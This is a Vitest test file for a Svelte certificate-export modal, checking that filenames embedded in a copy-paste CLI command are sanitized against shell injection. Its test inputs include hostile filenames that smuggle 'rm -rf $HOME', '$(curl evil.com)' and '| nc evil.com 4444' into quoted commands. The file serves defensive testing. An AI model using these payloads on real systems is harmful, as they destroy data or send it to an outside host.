// Vitest tests for CertExportModal.svelte — Sprint 3 D5 cert PDF + Sprint 5 D3
// #26 shell-injection sanitization.
//
// Protects invariants:
//   INV-48 — attack scenario coverage. bundleFileName embedded в `<pre>` CLI
//            command (`aurora-launch-reproduce "{name}" {hash}`) — chars outside
//            ASCII whitelist могут escape quoting и execute arbitrary commands
//            при copy-paste к shell. Sanitizer replaces unsafe filenames
//            placeholder + shows warning.
//   Sprint 5 D3 #26 — Sprint Buffer item closure.

import { describe, expect, it, beforeEach } from 'vitest';
import { render, screen, cleanup } from '@testing-library/svelte';

import CertExportModal from '../../src/lib/components/inspector/CertExportModal.svelte';
import type { VerificationResult } from '../../src/lib/ipc/client';

beforeEach(() => cleanup());

function makeVerification(
  overrides: Partial<VerificationResult> = {},
): VerificationResult {
  return {
    valid: true,
    signature_provenance: 'cloud_kms',
    signed_by: 'Aurora AI KMS',
    signed_at: '2026-05-21T00:00:00Z',
    key_fingerprint: 'AA:BB:CC:DD',
    composite_hash:
      'a'.repeat(64),
    manifest_revision: 1,
    trust_badge: 'production',
    failure_reason: null,
    ...overrides,
  };
}

function renderModal(bundlePath: string) {
  return render(CertExportModal, {
    props: {
      open: true,
      verificationResult: makeVerification(),
      bundlePath,
      appVersion: '0.1.6',
      onClose: () => {},
    },
  });
}

function getCliPre(container: HTMLElement): HTMLPreElement {
  const pre = container.querySelector('pre.cert-cmd');
  if (!pre) throw new Error('CLI <pre> not found');
  return pre as HTMLPreElement;
}

// ─── Whitelist passes ─────────────────────────────────────────────────────

describe('CertExportModal — safe filename passthrough', () => {
  it('ASCII alphanumeric filename rendered as-is в CLI', () => {
    const { container } = renderModal('C:/bundles/pharma_otc_immune.aurora');
    const cli = getCliPre(container).textContent ?? '';
    expect(cli).toContain('"pharma_otc_immune.aurora"');
    expect(cli).not.toContain('<имя_файла>');
    expect(container.querySelector('.cert-warning')).toBeNull();
  });

  it('filename с parens + dash + space allowed', () => {
    const { container } = renderModal('/tmp/bundle (v2) - final.aurora');
    const cli = getCliPre(container).textContent ?? '';
    expect(cli).toContain('"bundle (v2) - final.aurora"');
    expect(container.querySelector('.cert-warning')).toBeNull();
  });

  it('dotted filename с underscores allowed', () => {
    const { container } = renderModal('/data/run_2026_05_23.v1.aurora');
    const cli = getCliPre(container).textContent ?? '';
    expect(cli).toContain('"run_2026_05_23.v1.aurora"');
  });
});

// ─── Shell-injection vectors sanitized ────────────────────────────────────

describe('CertExportModal — shell injection vectors (Sprint 5 D3 #26)', () => {
  // NOTE: filenames cannot contain forward slash ('/' — path separator). Test
  // inputs must избегать '/' внутри filename, иначе bundlePath split eats half
  // ещё перед достижением sanitizer. Realistic Unix attack filenames:
  const SHELL_INJECTION_FILENAMES = [
    // Double-quote breakout — closes the outer "..." then injects rm -rf
    'bundle"; rm -rf $HOME #.aurora',
    // Backtick command substitution
    'bundle`whoami`.aurora',
    // $(...) command substitution
    'bundle$(curl evil.com).aurora',
    // Pipe to network (no path separator)
    'bundle | nc evil.com 4444 #.aurora',
    // Semicolon command separator (no path separator)
    'bundle;cat_etc_passwd.aurora',
    // Single quote (вне whitelist)
    "bundle's_cert.aurora",
    // Backslash escape attempts (no path separator)
    'bundle\\";rm.aurora',
    // Cyrillic content (UTF-8 outside ASCII whitelist) — placeholder rendered
    'бандл.aurora',
    // Tab char (whitespace control)
    'bundle\trm.aurora',
    // Ampersand для background job (cmd & cmd2)
    'bundle&rm.aurora',
    // Greater-than redirect
    'bundle>evil.txt.aurora',
  ];

  for (const filename of SHELL_INJECTION_FILENAMES) {
    it(`placeholder substituted: ${JSON.stringify(filename)}`, () => {
      const { container } = renderModal(`/tmp/${filename}`);
      const cli = getCliPre(container).textContent ?? '';
      // Must NOT contain raw filename
      expect(cli).not.toContain(filename);
      // Must show placeholder в quoted position
      expect(cli).toContain('"<имя_файла>"');
      // Must show warning UI
      const warning = container.querySelector('.cert-warning');
      expect(warning).not.toBeNull();
      expect(warning?.textContent ?? '').toMatch(/спецсимволы/i);
    });
  }
});

// ─── Display context (text rendering) unaffected ──────────────────────────

describe('CertExportModal — display context preserves filename', () => {
  it('"Файл:" <dd> shows raw filename (text-safe context)', () => {
    const filename = 'bundle"; rm -rf $HOME #.aurora';
    const { container } = renderModal(`/tmp/${filename}`);
    // Find the file display row (line 152 — <dt>Файл:</dt><dd>{bundleFileName}</dd>)
    const dt = Array.from(container.querySelectorAll('dt')).find(
      (el) => el.textContent?.includes('Файл'),
    );
    expect(dt).not.toBeUndefined();
    const dd = dt?.nextElementSibling as HTMLElement | null;
    expect(dd?.textContent ?? '').toContain(filename);
  });
});
